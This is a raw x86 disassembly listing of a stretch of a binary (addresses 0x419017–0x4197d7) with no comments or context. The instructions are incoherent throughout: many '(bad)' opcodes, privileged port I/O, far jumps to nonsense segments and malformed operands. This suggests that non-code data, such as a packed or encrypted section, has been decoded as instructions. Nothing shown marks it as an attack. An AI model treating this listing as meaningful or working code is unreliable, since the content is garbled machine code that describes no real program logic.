  419017:	je     0x419090
  419019:	stos   BYTE PTR es:[edi],al
  41901a:	lea    eax,[edi-0x6c]
  41901d:	sub    al,0xcd
  41901f:	push   edi
  419020:	imul   ecx,DWORD PTR [edx-0x599304c8],0xffffffc9
  419027:	dec    eax
  419028:	push   0xffffffbd
  41902a:	sbb    eax,0xc1fc8efb
  41902f:	dec    ebp
  419030:	xchg   DWORD PTR [esi],ecx
  419032:	dec    eax
  419033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419034:	pop    es
  419035:	cdq    
  419036:	ret    0x1a2d
  419039:	sub    BYTE PTR [ebx+ebx*2+0x0],bh
  41903d:	and    al,0x4f
  41903f:	jmp    0x37d5:0x85feb2b4
  419046:	lods   al,BYTE PTR ds:[esi]
  419047:	sub    al,0x2e
  419049:	fiadd  DWORD PTR [ecx]
  41904b:	cmp    BYTE PTR [ebx+0x2d],bh
  41904e:	jle    0x419075
  419050:	test   BYTE PTR [ebx+0xd],al
  419053:	leave  
  419054:	and    dl,BYTE PTR [esi-0x57]
  419057:	mov    dh,0x4c
  419059:	mov    ss,WORD PTR [esi-0x4834c499]
  41905f:	sbb    al,0xa0
  419061:	out    0xe3,eax
  419063:	inc    edi
  419064:	(bad)  
  419066:	arpl   WORD PTR [eax+ebp*8+0x59],bp
  41906a:	or     eax,0xbc4bad58
  41906f:	mov    esi,0x89595858
  419074:	ret    
  419075:	(bad)  
  419076:	cs pusha 
  419078:	and    BYTE PTR [eax],ah
  41907a:	adc    eax,0x4d52329f
  41907f:	adc    DWORD PTR [eax+0x19],0x12
  419083:	dec    esp
  419084:	aaa    
  419085:	mov    ch,0xfc
  419087:	and    bl,BYTE PTR [ecx]
  419089:	jne    0x41908b
  41908b:	out    0x46,eax
  41908d:	mov    eax,ds:0x52d4a7fd
  419092:	inc    eax
  419093:	cmp    BYTE PTR [eax],0xed
  419096:	adc    DWORD PTR [esi+0x1c],ecx
  419099:	sar    DWORD PTR [edx-0x3a],0x4a
  41909d:	jmp    0x8f3e:0xf1800d6b
  4190a4:	or     ecx,edi
  4190a6:	pop    edx
  4190a7:	lods   eax,DWORD PTR ds:[esi]
  4190a8:	repz xor DWORD PTR [ebx],edi
  4190ab:	in     al,0x85
  4190ad:	pop    ds
  4190ae:	mov    ebp,0xa273030a
  4190b3:	stos   BYTE PTR es:[edi],al
  4190b4:	xchg   DWORD PTR [ebx+0x5c],esi
  4190b7:	test   eax,0xca4be44f
  4190bc:	mov    edx,0xa98d8ede
  4190c1:	mov    bh,0xae
  4190c3:	(bad)  
  4190c4:	fadd   DWORD PTR [ebp-0x15]
  4190c7:	push   0x26
  4190c9:	push   eax
  4190ca:	sub    eax,0x68618ae5
  4190cf:	mov    esp,0x86def97d
  4190d5:	aaa    
  4190d6:	leave  
  4190d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d8:	es jecxz 0x41910c
  4190db:	sar    dh,cl
  4190dd:	fwait
  4190de:	xchg   edi,eax
  4190df:	outs   dx,BYTE PTR ds:[esi]
  4190e0:	in     al,dx
  4190e1:	mov    bl,0xd2
  4190e3:	das    
  4190e4:	mov    edx,0xa2704b55
  4190e9:	xchg   edi,eax
  4190ea:	enter  0xe1bd,0x6e
  4190ee:	push   ebp
  4190ef:	shl    eax,0x16
  4190f2:	hlt    
  4190f3:	std    
  4190f4:	add    DWORD PTR [eax+0x75e8cca2],esi
  4190fa:	or     edx,ecx
  4190fc:	repz fs int 0x6a
  419100:	into   
  419101:	mov    ch,0x9
  419103:	call   0x1a7ff998
  419108:	push   ebp
  419109:	rcr    DWORD PTR [ebp-0x56],cl
  41910c:	out    dx,al
  41910d:	sub    DWORD PTR [eax],0x2a57d85d
  419113:	outs   dx,DWORD PTR ds:[esi]
  419114:	push   ebp
  419115:	call   0xc5c5:0xf32ae422
  41911c:	jns    0x41910a
  41911e:	cmp    dl,0x7e
  419121:	imul   ecx,esi,0xca7c0621
  419127:	sub    ebp,eax
  419129:	xor    ebp,edx
  41912b:	xchg   ebp,eax
  41912c:	call   0xa653:0xd7bfa037
  419133:	add    ah,BYTE PTR [ebp+eax*4-0x27a11da5]
  41913a:	bound  ebx,QWORD PTR [edx+0x7346f57e]
  419140:	push   0xfffffff2
  419142:	fisub  DWORD PTR [edi-0x1c57252d]
  419148:	push   eax
  419149:	test   al,0xee
  41914b:	sub    edi,DWORD PTR [ecx+0x5efb1b6c]
  419151:	dec    edx
  419152:	shl    BYTE PTR [eax-0x55],1
  419155:	cwde   
  419156:	mov    BYTE PTR [edx+0x762ca5f1],dh
  41915c:	stc    
  41915d:	jge    0x419172
  41915f:	sub    edx,DWORD PTR [edx-0x40]
  419162:	test   al,0xee
  419164:	dec    eax
  419165:	add    DWORD PTR [ebp-0x52],edi
  419168:	fstp   st(2)
  41916a:	call   0xc49e928a
  41916f:	rol    BYTE PTR [edx],0x50
  419172:	jmp    0xc9a5:0x557d3a4e
  419179:	bound  ebp,QWORD PTR [ebp+0xf]
  41917c:	scas   eax,DWORD PTR es:[edi]
  41917d:	inc    ebp
  41917e:	sub    eax,0x784b554e
  419183:	or     al,0x93
  419185:	(bad)  
  419186:	sbb    BYTE PTR [edi],al
  419188:	sbb    BYTE PTR [edx],0xe6
  41918b:	test   ebp,esi
  41918d:	push   ecx
  41918e:	xor    al,0x3c
  419190:	cld    
  419191:	jnp    0x4191ea
  419193:	mov    cl,0x50
  419195:	push   edi
  419196:	cmp    edi,DWORD PTR [edi-0x24]
  419199:	adc    al,0xd6
  41919b:	fs je  0x4191dc
  41919e:	adc    edx,DWORD PTR [edx+eiz*4+0x16]
  4191a2:	xchg   ebx,eax
  4191a3:	lahf   
  4191a4:	scas   eax,DWORD PTR es:[edi]
  4191a5:	add    ebx,DWORD PTR [edx+0x66]
  4191a8:	ds push edi
  4191aa:	mov    cs:0xf15b6097,eax
  4191b0:	pop    DWORD PTR [ebx+0x4d]
  4191b3:	inc    ebx
  4191b4:	lock scas eax,DWORD PTR es:[edi]
  4191b6:	in     eax,0xcc
  4191b8:	out    0x1a,al
  4191ba:	ds sti 
  4191bc:	xchg   ebp,eax
  4191bd:	cmp    eax,0xc0df17a3
  4191c2:	xchg   ebp,eax
  4191c3:	mov    ds:0x47293910,al
  4191c8:	cmp    DWORD PTR [esi],edx
  4191ca:	ret    0x8535
  4191cd:	sub    BYTE PTR [edx],ch
  4191cf:	push   ds
  4191d0:	xor    DWORD PTR [edx],edx
  4191d2:	sti    
  4191d3:	(bad)  
  4191d4:	mov    eax,fs
  4191d6:	nop
  4191d7:	loopne 0x4191b1
  4191d9:	ja     0x419182
  4191db:	ins    BYTE PTR es:[edi],dx
  4191dc:	pop    edx
  4191dd:	push   ds
  4191de:	pusha  
  4191df:	xchg   edx,eax
  4191e0:	(bad)  
  4191e2:	cmp    BYTE PTR [esi],cl
  4191e4:	or     eax,0x6aacf799
  4191e9:	(bad)  
  4191ea:	jmp    0xef4d:0xffee486f
  4191f1:	xor    BYTE PTR [esi+ebx*1],dh
  4191f4:	xchg   ebx,eax
  4191f5:	je     0x41925e
  4191f7:	shr    edi,cl
  4191f9:	(bad)  
  4191fa:	mov    edx,0xbdbd6888
  4191ff:	or     edx,DWORD PTR [edx]
  419201:	popa   
  419202:	in     eax,dx
  419203:	push   ebp
  419204:	adc    ah,BYTE PTR [esi]
  419206:	xchg   esp,eax
  419207:	push   cs
  419208:	xchg   ebp,eax
  419209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41920a:	mov    DWORD PTR [eax],ecx
  41920c:	pop    ebx
  41920d:	inc    ecx
  41920e:	mov    edi,0xa7a9e0f0
  419213:	inc    esp
  419214:	jno    0x419216
  419216:	in     eax,dx
  419217:	(bad)  
  419218:	clc    
  419219:	iret   
  41921a:	loop   0x419287
  41921c:	scas   al,BYTE PTR es:[edi]
  41921d:	cwde   
  41921e:	xor    ah,ah
  419220:	xchg   BYTE PTR [esi],cl
  419222:	gs pop ebx
  419224:	mov    al,ds:0xa17ff4d6
  419229:	add    bh,BYTE PTR [esi+0x6f]
  41922c:	(bad)  
  41922d:	ffreep st(7)
  41922f:	add    eax,esp
  419231:	xor    al,0x73
  419233:	jg     0x4192a9
  419235:	push   ds
  419236:	jb     0x419212
  419238:	adc    BYTE PTR [eax+0x59532489],bl
  41923e:	shl    ch,0xb2
  419241:	jnp    0x4192a8
  419243:	scas   eax,DWORD PTR es:[edi]
  419244:	mov    cl,0x8b
  419246:	push   edx
  419247:	push   cs
  419248:	std    
  419249:	jmp    0x25e082fb
  41924e:	adc    eax,0x82223bca
  419253:	call   0xcf67:0xaa017409
  41925a:	clc    
  41925b:	ret    
  41925c:	fs and al,0xf
  41925f:	jns    0x4192ba
  419261:	add    esi,eax
  419263:	out    dx,eax
  419264:	adc    BYTE PTR [ebp+0x23],al
  419267:	pop    esi
  419268:	fld    DWORD PTR [esi]
  41926a:	push   esp
  41926b:	and    esi,eax
  41926d:	mov    dl,0x81
  41926f:	(bad)  
  419270:	in     al,dx
  419271:	xor    al,0x50
  419273:	sbb    eax,0xdc9df2e3
  419278:	pop    ds
  419279:	dec    eax
  41927b:	add    bh,BYTE PTR [edi+0x23]
  41927e:	mov    ds:0xaf91db7c,al
  419283:	xchg   esp,eax
  419284:	fild   DWORD PTR [ebx]
  419286:	les    ecx,FWORD PTR [edi+0x3979bc87]
  41928c:	jno    0x419309
  41928e:	nop
  41928f:	mov    ?,WORD PTR [edi+esi*1-0x50d2965e]
  419296:	sbb    edi,DWORD PTR [ebx+0x4714d67]
  41929c:	or     al,0xd0
  41929e:	sub    ebx,eax
  4192a0:	dec    eax
  4192a1:	mov    ebx,0xbf167dc3
  4192a6:	mov    ?,WORD PTR [edx]
  4192a8:	out    dx,al
  4192a9:	xchg   esp,eax
  4192aa:	adc    BYTE PTR [ecx-0x3],al
  4192ad:	push   0x7f95a32
  4192b2:	and    eax,0xa506d695
  4192b7:	sub    bh,BYTE PTR [esi-0x6e053465]
  4192bd:	popa   
  4192be:	mov    dh,0xe4
  4192c0:	xor    BYTE PTR [eax+0x11f59360],ch
  4192c6:	cld    
  4192c7:	dec    edi
  4192c8:	or     DWORD PTR [ecx-0x43684c1f],ecx
  4192ce:	or     DWORD PTR [edx],0xffffffab
  4192d1:	rcr    BYTE PTR [ebx-0x458d88d4],0xaf
  4192d8:	loope  0x41934a
  4192da:	test   BYTE PTR [edi+0x2a],ah
  4192dd:	dec    ebx
  4192de:	fstp   QWORD PTR ss:[edi+0x2064a21e]
  4192e5:	ret    
  4192e6:	lock sub edi,eax
  4192e9:	in     eax,0x44
  4192eb:	inc    ebp
  4192ec:	outs   dx,DWORD PTR ds:[esi]
  4192ed:	out    0xc5,eax
  4192ef:	pop    ecx
  4192f0:	stos   BYTE PTR es:[edi],al
  4192f1:	xor    DWORD PTR [ebp-0x6385af75],edx
  4192f7:	es and eax,0x360c9a3e
  4192fd:	mov    ecx,0x6db5f3ff
  419302:	dec    esp
  419303:	sahf   
  419304:	ins    DWORD PTR es:[edi],dx
  419305:	mov    cs,ebp
  419307:	inc    edx
  419308:	xor    dl,bh
  41930a:	repnz push ebp
  41930c:	inc    eax
  41930d:	pop    ss
  41930e:	dec    ebp
  41930f:	dec    esi
  419310:	push   esi
  419311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419312:	das    
  419313:	jnp    0x419329
  419315:	add    BYTE PTR [edi],bh
  419317:	pop    eax
  419318:	ss sbb al,0x29
  41931b:	mov    cl,0x96
  41931d:	sub    eax,0xd4f43cae
  419322:	xor    eax,0xdaf007a1
  419327:	push   ds
  419328:	sbb    eax,0x74d5e020
  41932d:	adc    bl,BYTE PTR ds:[esi]
  419330:	jb     0x419312
  419332:	pusha  
  419333:	xor    al,0x39
  419335:	cmp    BYTE PTR [ebp-0x3645c6c0],dl
  41933b:	sar    DWORD PTR [esi],1
  41933d:	cmp    ebx,DWORD PTR [edx]
  41933f:	lahf   
  419340:	mov    edx,0x2b716edf
  419345:	cmp    al,BYTE PTR [esp+ebp*1+0x47]
  419349:	adc    BYTE PTR [ecx+0x8e83171],ah
  41934f:	fadd   DWORD PTR [edi]
  419351:	aaa    
  419352:	mov    cl,0xb3
  419354:	xor    cl,BYTE PTR [eax+0x6a]
  419357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419358:	mov    DWORD PTR [ecx+0x5a],0x9d41bf5b
  41935f:	mov    edi,eax
  419361:	in     eax,dx
  419362:	push   0x4e8d1f28
  419367:	imul   eax,DWORD PTR [eax-0x396e3004],0xfd675576
  419371:	cwde   
  419372:	shl    BYTE PTR [ebp+ebx*1-0x3f],cl
  419376:	enter  0xe7ce,0xdb
  41937a:	jmp    0x4193e6
  41937c:	add    al,0x4e
  41937e:	cmp    BYTE PTR [edi-0x44240183],ah
  419384:	in     eax,dx
  419385:	add    BYTE PTR [edx],ah
  419387:	test   eax,0xefa9c0e1
  41938c:	adc    ebx,edx
  41938e:	not    DWORD PTR [edi-0x7eab26ee]
  419394:	jle    0x419357
  419396:	adc    ch,BYTE PTR [ecx+0x43]
  419399:	adc    BYTE PTR [ebp+ebp*1-0x59abc9d4],cl
  4193a0:	inc    edx
  4193a1:	lods   eax,DWORD PTR ds:[esi]
  4193a2:	mov    eax,0x635ab7e9
  4193a7:	xchg   DWORD PTR [ecx+0x18],edx
  4193aa:	jmp    0xf2a45e2b
  4193af:	das    
  4193b0:	jp     0x4193f0
  4193b2:	scas   eax,DWORD PTR es:[edi]
  4193b3:	daa    
  4193b4:	push   ebx
  4193b5:	out    0x4a,al
  4193b7:	es mov ecx,0x594bb93a
  4193bd:	repz mov al,ds:0x8ab9ae72
  4193c3:	mov    ds:0xd93061db,al
  4193c8:	cmp    edx,DWORD PTR [ebp+0x59]
  4193cb:	and    eax,DWORD PTR [edx]
  4193cd:	mov    dh,0x41
  4193cf:	popa   
  4193d0:	leave  
  4193d1:	add    ch,dl
  4193d3:	sbb    ecx,DWORD PTR [eax]
  4193d5:	inc    edx
  4193d6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4193d8:	ins    BYTE PTR es:[edi],dx
  4193d9:	lea    eax,[eax-0x2]
  4193dc:	jnp    0x419384
  4193de:	gs call 0xc0b6:0x62c92590
  4193e6:	in     al,0x9f
  4193e8:	(bad)  
  4193e9:	sub    dl,BYTE PTR [ebx]
  4193eb:	call   0xd362:0xd8434c03
  4193f2:	adc    bh,BYTE PTR [edx+0x45]
  4193f5:	mov    esi,0x9a8ff0b1
  4193fa:	pop    edi
  4193fb:	dec    edi
  4193fc:	jmp    0xb5b1:0xf8e149dd
  419403:	nop
  419404:	popf   
  419405:	mov    cl,0xf
  419407:	push   cs
  419408:	add    DWORD PTR [esi],esp
  41940a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41940b:	dec    bp
  41940d:	cld    
  41940e:	pusha  
  41940f:	or     eax,DWORD PTR [esi-0x2df3d2e0]
  419415:	mov    esp,0x4136a7e8
  41941a:	leave  
  41941b:	pushw  cs
  41941d:	mov    ah,0x41
  41941f:	inc    edi
  419420:	(bad)  
  419421:	neg    DWORD PTR [edi+0x3e]
  419424:	dec    eax
  419425:	mov    bh,0xd
  419427:	cmp    DWORD PTR ds:0x172ebe89,edx
  41942d:	jae    0x419423
  41942f:	(bad)  
  419430:	fnstcw WORD PTR [edi]
  419432:	add    BYTE PTR ds:0x2c483525,bh
  419438:	test   eax,0xfd3508ae
  41943d:	jo     0x419464
  41943f:	lahf   
  419440:	out    dx,al
  419441:	xor    DWORD PTR [edi],ebp
  419443:	data16 mov al,0x63
  419446:	sahf   
  419447:	xchg   ecx,eax
  419448:	daa    
  419449:	cwde   
  41944a:	aas    
  41944b:	push   eax
  41944c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41944d:	add    BYTE PTR [edx+edx*4+0x41],0xb2
  419452:	sub    ecx,eax
  419454:	push   esi
  419455:	or     al,0x2e
  419457:	jecxz  0x419412
  419459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41945a:	dec    esp
  41945b:	xchg   esp,eax
  41945c:	xchg   edx,eax
  41945d:	addr16 (bad) 
  41945f:	mov    eax,0x334e315b
  419464:	sbb    DWORD PTR [ebx],esp
  419466:	pop    ebp
  419467:	sbb    bh,BYTE PTR [edi+0x5c7e796c]
  41946d:	mov    ds:0x6c57b94,al
  419472:	aas    
  419473:	mov    edi,DWORD PTR [ebx]
  419475:	and    DWORD PTR [edi+0x71],ecx
  419478:	repz ss es test eax,0xd4d309eb
  419480:	jl     0x4194f3
  419482:	fild   DWORD PTR [eax]
  419484:	inc    esp
  419485:	inc    eax
  419486:	mov    dh,0x97
  419488:	xor    eax,0x206f01e1
  41948d:	jno    0x419460
  41948f:	pop    edi
  419490:	xchg   esi,eax
  419491:	out    dx,al
  419492:	fwait
  419493:	push   esi
  419494:	shr    DWORD PTR [ebx-0x464b97fb],0x44
  41949b:	sub    ebp,ebp
  41949d:	push   ecx
  41949e:	enter  0x3db7,0x28
  4194a2:	xor    eax,0xf829483f
  4194a7:	dec    edi
  4194a8:	sbb    DWORD PTR [edx-0x3b3ddf6e],eax
  4194ae:	pop    esi
  4194af:	sub    al,0x8c
  4194b1:	into   
  4194b2:	inc    ebx
  4194b3:	in     eax,0xf8
  4194b5:	sbb    esp,DWORD PTR [esi]
  4194b7:	xchg   esp,eax
  4194b8:	xchg   ecx,eax
  4194b9:	pop    ecx
  4194ba:	inc    ecx
  4194bb:	dec    eax
  4194bc:	ins    BYTE PTR es:[edi],dx
  4194bd:	jne    0x4194b8
  4194bf:	mov    ecx,0xe9a6fb04
  4194c4:	out    dx,al
  4194c5:	scas   eax,DWORD PTR es:[edi]
  4194c6:	lods   al,BYTE PTR ds:[esi]
  4194c7:	scas   eax,DWORD PTR es:[edi]
  4194c8:	push   edx
  4194c9:	ja     0x4194cb
  4194cb:	popf   
  4194cc:	mov    esp,0x3e9d0222
  4194d1:	inc    edi
  4194d2:	adc    al,0x31
  4194d4:	jae    0x419527
  4194d6:	out    dx,eax
  4194d7:	scas   al,BYTE PTR es:[edi]
  4194d8:	ins    DWORD PTR es:[edi],dx
  4194d9:	in     eax,0x9b
  4194db:	fldenv [esi+0x69aea15]
  4194e1:	aam    0x79
  4194e3:	or     BYTE PTR [esp+ecx*4-0x6a],bl
  4194e7:	xchg   esp,eax
  4194e8:	js     0x41946a
  4194ea:	fmul   st(2),st
  4194ec:	(bad)  
  4194ed:	pop    eax
  4194ee:	stos   BYTE PTR es:[edi],al
  4194ef:	pop    ecx
  4194f0:	ror    edx,0x9d
  4194f3:	pusha  
  4194f4:	push   edx
  4194f5:	cmp    bh,BYTE PTR [edi-0x18]
  4194f8:	shl    bh,cl
  4194fa:	icebp  
  4194fb:	(bad)  [ebp+0x3b]
  4194fe:	sub    DWORD PTR es:[edx+0x79],0x7cd2cf98
  419506:	xchg   edx,eax
  419507:	rol    ebp,1
  419509:	(bad)  
  41950a:	in     eax,0x1a
  41950c:	iret   
  41950d:	mov    cl,0x5
  41950f:	cmp    BYTE PTR [ebp+0x3cbe0156],dh
  419515:	jae    0x4194f1
  419517:	(bad)  
  419518:	test   eax,0xc4581005
  41951d:	inc    edi
  41951e:	pop    edi
  41951f:	leave  
  419520:	xchg   ebp,eax
  419521:	lods   al,BYTE PTR ds:[esi]
  419522:	cmp    al,0x30
  419524:	mov    al,ds:0x916e0708
  419529:	mov    gs,WORD PTR [eax+0x45]
  41952c:	cmp    cl,BYTE PTR [ebp-0x4de105f3]
  419532:	cmp    ch,ah
  419534:	(bad)  
  419536:	adc    DWORD PTR [ebx],ecx
  419538:	neg    DWORD PTR [ecx+0x2064c0a2]
  41953e:	ds inc esp
  419540:	popf   
  419541:	add    esp,DWORD PTR [ebp+0x15337fae]
  419547:	push   es
  419548:	mov    bh,0x58
  41954a:	push   0x16
  41954c:	jmp    0x4195cc
  41954e:	dec    esi
  41954f:	cmp    dh,dh
  419551:	imul   ebp,edi,0x58afc544
  419557:	cld    
  419558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419559:	mov    ds:0x99b84a94,eax
  41955e:	mov    ch,0x41
  419560:	repz inc ebp
  419562:	inc    eax
  419563:	and    BYTE PTR [esi-0xf],al
  419566:	arpl   WORD PTR [ecx-0x48],si
  419569:	sub    eax,0xad934542
  41956e:	(bad)  
  41956f:	cmp    dl,BYTE PTR [esi+0x63]
  419572:	popf   
  419573:	scas   eax,DWORD PTR es:[edi]
  419574:	int    0xa1
  419576:	inc    ebx
  419577:	ficom  DWORD PTR [ebp-0x14]
  41957a:	jo     0x4195ad
  41957c:	add    dh,bh
  41957e:	mov    ds:0x5c5f4bcf,eax
  419583:	scas   al,BYTE PTR es:[edi]
  419584:	sbb    ah,BYTE PTR [edi+0xa2194b2]
  41958a:	fisub  DWORD PTR [edx+0x8]
  41958d:	mov    edi,0xfdba9841
  419592:	add    al,0x80
  419594:	loope  0x4195fb
  419596:	(bad)  
  419598:	sbb    al,0xed
  41959a:	pop    edx
  41959b:	cld    
  41959c:	test   al,0x52
  41959e:	iret   
  41959f:	or     BYTE PTR [ecx],bh
  4195a1:	mov    ebp,ds
  4195a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a4:	add    edi,0x7a
  4195a7:	retf   
  4195a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195a9:	jno    0x41954b
  4195ab:	sbb    DWORD PTR [esi+0x18],edx
  4195ae:	or     al,0x1d
  4195b0:	out    dx,al
  4195b1:	cmp    eax,DWORD PTR ds:0xc81de1a
  4195b7:	mov    BYTE PTR [ebp-0x56],dh
  4195ba:	outs   dx,BYTE PTR ds:[esi]
  4195bb:	lock outs dx,BYTE PTR ds:[esi]
  4195bd:	out    0x73,eax
  4195bf:	adc    esp,DWORD PTR [ecx-0x6588483b]
  4195c5:	sbb    al,0xc
  4195c7:	dec    ecx
  4195c8:	dec    eax
  4195c9:	pusha  
  4195ca:	mov    eax,ds:0xdccb7380
  4195cf:	sub    bh,ah
  4195d1:	ror    dh,0x74
  4195d4:	adc    cl,BYTE PTR [esi+ebp*1-0xa]
  4195d8:	cmc    
  4195d9:	push   edi
  4195da:	shr    BYTE PTR [edx],cl
  4195dc:	or     DWORD PTR [edi-0x46],ecx
  4195df:	loopne 0x419626
  4195e1:	and    ah,dh
  4195e3:	push   ecx
  4195e4:	add    eax,0xff0bcb6d
  4195e9:	sahf   
  4195ea:	daa    
  4195eb:	int    0x81
  4195ed:	jmp    0x9bf92829
  4195f2:	(bad)  
  4195f4:	shr    bh,0x55
  4195f7:	adc    bh,dl
  4195f9:	cmp    ebx,ebx
  4195fb:	lock or eax,ecx
  4195fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ff:	xchg   ebp,eax
  419600:	jnp    0x4195ef
  419602:	lahf   
  419603:	(bad)  
  419604:	ffree  st(3)
  419606:	or     DWORD PTR [eax+0x5accb555],0xffffffb4
  41960d:	fucomp st(5)
  41960f:	cmp    esp,ebx
  419611:	sbb    DWORD PTR [edx-0x3ac9780b],esi
  419617:	add    BYTE PTR [edi],bh
  419619:	push   ebp
  41961a:	inc    eax
  41961b:	aas    
  41961c:	jg     0x419633
  41961e:	in     al,0xc1
  419620:	dec    edi
  419621:	mov    edx,0x4a5865d1
  419626:	loope  0x419677
  419628:	jle    0x41968b
  41962a:	fld    DWORD PTR [edx+eax*1+0x352409c7]
  419631:	mov    dh,0x9a
  419633:	mov    edi,0xac6504e1
  419638:	push   ss
  419639:	retf   0xa2e3
  41963c:	mov    cl,0x9a
  41963e:	jge    0x4195ea
  419640:	cmp    edi,DWORD PTR [edx+ecx*2-0x210f061f]
  419647:	sub    DWORD PTR [ebx+0x4],ebp
  41964a:	pop    ecx
  41964b:	dec    eax
  41964c:	dec    edi
  41964d:	pop    esp
  41964e:	sub    ecx,esp
  419650:	sub    ch,BYTE PTR [eax-0x69]
  419653:	fmul   QWORD PTR [edi]
  419655:	(bad)  
  419656:	aam    0x37
  419658:	fdiv   DWORD PTR [ebx-0x3d4fccb0]
  41965e:	adc    BYTE PTR [eax],al
  419660:	add    eax,0x7a764b88
  419665:	je     0x419680
  419667:	retf   0x3b9e
  41966a:	ins    DWORD PTR es:[edi],dx
  41966b:	sub    al,0x77
  41966d:	sbb    DWORD PTR [edi],esi
  41966f:	lods   al,BYTE PTR ds:[esi]
  419670:	mov    ds,WORD PTR [ecx-0x80]
  419673:	mov    WORD PTR [edx-0x2],fs
  419676:	add    ah,BYTE PTR [esi-0x48]
  419679:	push   ss
  41967a:	dec    edx
  41967b:	mov    ch,0x9a
  41967d:	popa   
  41967e:	inc    eax
  41967f:	aam    0xe0
  419681:	cmc    
  419682:	jl     0x419662
  419684:	cmovns esi,DWORD PTR [esi-0x23]
  419688:	das    
  419689:	mov    esp,0x950418fe
  41968e:	push   eax
  41968f:	ret    0xbc39
  419692:	xlat   BYTE PTR ds:[ebx]
  419693:	rcl    DWORD PTR [esi],1
  419695:	clc    
  419696:	stos   DWORD PTR es:[edi],eax
  419697:	sbb    eax,0x7633b131
  41969c:	pushf  
  41969d:	shr    DWORD PTR [eax+0x66],cl
  4196a0:	imul   esi,DWORD PTR [eax+0x659a56b8],0x42f94d7a
  4196aa:	xchg   edx,eax
  4196ab:	xor    ah,BYTE PTR [esi]
  4196ad:	jbe    0x4196c7
  4196af:	pop    esp
  4196b0:	clc    
  4196b1:	sbb    edx,esp
  4196b3:	out    dx,eax
  4196b4:	shl    BYTE PTR [edx+0xc1655b4],cl
  4196ba:	sbb    eax,0x141e8e97
  4196bf:	out    0xcd,eax
  4196c1:	push   ebp
  4196c2:	push   0x2a
  4196c4:	daa    
  4196c5:	or     dh,BYTE PTR [edi+ecx*1+0xaa59d01]
  4196cc:	clc    
  4196cd:	or     eax,0x38b45786
  4196d2:	arpl   WORD PTR [edi-0x4b],bp
  4196d5:	add    cl,BYTE PTR [ebx-0x31]
  4196d8:	gs inc edx
  4196da:	dec    esi
  4196db:	cmp    al,0xa7
  4196dd:	out    0x35,al
  4196df:	sahf   
  4196e0:	test   BYTE PTR [edx+ecx*2-0x42],al
  4196e4:	lods   al,BYTE PTR ds:[esi]
  4196e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e7:	sub    cl,0x7b
  4196ea:	call   0x495ed5cb
  4196ef:	jns    0x419724
  4196f1:	fisttp DWORD PTR [esp+edi*8-0x736f37ac]
  4196f8:	in     eax,0xfb
  4196fa:	push   ebp
  4196fb:	lea    esp,ds:0xadfac480
  419701:	fsub   DWORD PTR [ebx-0x1b]
  419704:	or     ah,BYTE PTR [esi]
  419706:	test   ebx,ebp
  419708:	repz inc edx
  41970a:	add    DWORD PTR [ebx+ebp*1+0x6664231],ecx
  419711:	in     eax,0x14
  419713:	xor    dh,BYTE PTR [edx-0x2c4aa5c5]
  419719:	out    dx,al
  41971a:	(bad)
  41971d:	or     ecx,DWORD PTR [ecx-0x3f]
  419720:	or     DWORD PTR [ebp+0x31],edx
  419723:	mov    eax,0xd5196b45
  419728:	scas   eax,DWORD PTR es:[edi]
  419729:	mov    edi,0x18aabcbc
  41972e:	lds    ecx,FWORD PTR [edx-0x7a]
  419731:	push   esi
  419732:	sub    al,0xe
  419734:	shr    DWORD PTR cs:[ebx-0x1357de35],1
  41973b:	sub    DWORD PTR [ecx+0x5a238c3],esi
  419741:	mov    ebx,0x9bc7fa61
  419746:	repz cdq 
  419748:	xchg   DWORD PTR [eax],edi
  41974a:	push   edi
  41974b:	or     ebx,edi
  41974d:	xchg   ebp,eax
  41974e:	mov    dl,0xdc
  419750:	xor    dh,BYTE PTR [ebx]
  419752:	mov    edi,0xd6696188
  419757:	adc    ch,ch
  419759:	int3   
  41975a:	(bad)  
  41975b:	xor    al,BYTE PTR [edx+0x5cb850fe]
  419761:	test   eax,0x9e7b6a91
  419766:	mov    cl,0x5b
  419768:	mov    dh,BYTE PTR [edx+0x65]
  41976b:	jge    0x4197b5
  41976d:	xchg   ebx,eax
  41976e:	dec    eax
  41976f:	popf   
  419770:	jnp    0x419760
  419772:	xor    ebx,edx
  419774:	outs   dx,BYTE PTR ds:[esi]
  419775:	lock xor BYTE PTR [ecx+0x68],ch
  419779:	sbb    esp,esp
  41977b:	cmp    dl,cl
  41977d:	pop    ss
  41977e:	jge    0x419799
  419780:	pop    ebp
  419781:	xchg   ebp,eax
  419782:	mov    al,ds:0x7248ef22
  419787:	mov    eax,ds:0x1e987a96
  41978c:	dec    ebp
  41978d:	retf   
  41978e:	add    BYTE PTR [esi-0x773b85c7],0xbc
  419795:	repz fst st(7)
  419798:	int3   
  419799:	pop    ss
  41979a:	inc    esi
  41979b:	lahf   
  41979c:	adc    al,0x20
  41979e:	out    0xae,eax
  4197a0:	out    0x56,al
  4197a2:	adc    edi,DWORD PTR [esi+0x596fb0d9]
  4197a8:	fdivr  DWORD PTR [ecx-0x63]
  4197ab:	mov    ss,WORD PTR [eax+0x13]
  4197ae:	loopne 0x4197ac
  4197b0:	int3   
  4197b1:	cdq    
  4197b2:	call   0x10d4fa30
  4197b7:	shl    BYTE PTR [edx+ebp*8+0x238a0816],1
  4197be:	data16 loopne 0x41981a
  4197c1:	dec    ebp
  4197c2:	and    esp,DWORD PTR [edx]
  4197c4:	push   ds
  4197c5:	fcmovnbe st,st(6)
  4197c7:	push   0x49
  4197c9:	cwde   
  4197ca:	inc    esp
  4197cb:	or     BYTE PTR [edx-0x4740d54b],dl
  4197d1:	mov    edi,0x196f43f2
  4197d6:	pop    esi
  4197d7:	or     edx,esi
